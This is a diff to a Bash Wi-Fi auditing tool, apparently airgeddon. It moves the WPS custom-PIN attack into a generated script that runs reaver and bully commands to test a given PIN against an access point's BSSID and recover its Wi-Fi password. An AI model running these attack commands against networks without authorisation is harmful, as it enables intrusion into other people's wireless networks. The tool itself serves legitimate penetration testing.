@@ -4613,12 +4613,14 @@ function exec_wps_custom_pin_reaver_attack() {
 	echo
 	language_strings "${language}" 32 "green"
 
+	set_wps_attack_script "reaver" "custompin"
+
 	echo
 	language_strings "${language}" 33 "yellow"
 	language_strings "${language}" 366 "blue"
 	language_strings "${language}" 4 "read"
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS custom pin reaver attack" -e "reaver -i ${interface} -b ${wps_bssid} -c ${wps_channel} -L -f -n -p ${custom_pin} -a -g 1 -vvv && echo \"Close this window\"" > /dev/null 2>&1
+	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS custom pin reaver attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
 }
 
 #Execute bully pixie dust attack
@@ -6812,9 +6814,9 @@ function set_wps_attack_script() {
 			"pindb")
 				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -L -f -n -a -g 1 -d 2 -vvv -p "
 			;;
-			#"custompin")
-				#TODO pending
-			#;;
+			"custompin")
+				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -L -f -n -a -g 1 -vvv -p "
+			;;
 			#"pixiedust")
 				#TODO pending
 			#;;
@@ -6829,7 +6831,7 @@ function set_wps_attack_script() {
 				attack_cmd1="bully \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -L -F -B -v ${bully_verbosity} -p "
 			;;
 			"custompin")
-				attack_cmd1="bully \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -L -F -B -v ${bully_verbosity} -p ${custom_pin}"
+				attack_cmd1="bully \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -L -F -B -v ${bully_verbosity} -p "
 			;;
 			#"pixiedust")
 				#TODO pending
@@ -6850,12 +6852,17 @@ function set_wps_attack_script() {
 	EOF
 
 	cat >&7 <<-'EOF'
-		if [ "${script_wps_attack_mode}" = "pindb" ]; then
+		case ${script_wps_attack_mode} in
 	EOF
 
 	cat >&7 <<-EOF
-			script_pins_found=(${pins_found[@]})
-		fi
+			"pindb")
+				script_pins_found=(${pins_found[@]})
+			;;
+			"custompin")
+				current_pin=${custom_pin}
+			;;
+		esac
 
 		pin_header1="${white_color}Testing PIN "
 		pin_header2=" (${yellow_color}"
@@ -7024,8 +7031,8 @@ function set_wps_attack_script() {
 
 	cat >&7 <<-EOF
 			echo
-			pin_cracked_msg="${white_color}PIN cracked: "
-			password_cracked_msg="${white_color}Password cracked: "
+			pin_cracked_msg="${white_color}PIN cracked: ${yellow_color}"
+			password_cracked_msg="${white_color}Password cracked: ${yellow_color}"
 	EOF
 
 	cat >&7 <<-'EOF'
